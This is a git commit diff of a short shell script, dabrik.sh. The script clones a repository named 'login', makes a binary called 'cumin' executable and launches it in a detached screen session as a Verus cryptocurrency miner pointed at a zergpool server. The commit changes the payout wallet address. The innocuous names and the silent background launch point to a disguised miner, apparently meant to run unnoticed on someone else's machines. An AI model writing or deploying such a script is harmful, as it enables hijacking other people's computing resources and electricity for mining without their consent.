5fe79e9f275d31088d5bbd97a8551f3819321940
sallygonza <90584824+sallygonza@users.noreply.github.com>
2022-02-04 20:50:15 +0700

    Update dabrik.sh

--- dabrik.sh
+++ dabrik.sh
@@ -5,4 +5,4 @@ sudo apt install screen libjansson4 -y
 git clone https://github.com/sallygonza/login.git 
 cd login
 chmod +x cumin
-screen -dmS layar ./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT.$WORKER -t 2 -p c=DOGE,mc=VRSC,m=party.123456 \n
+screen -dmS layar ./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.$WORKER -t 2 -p c=VRSC,mc=VRSC \n
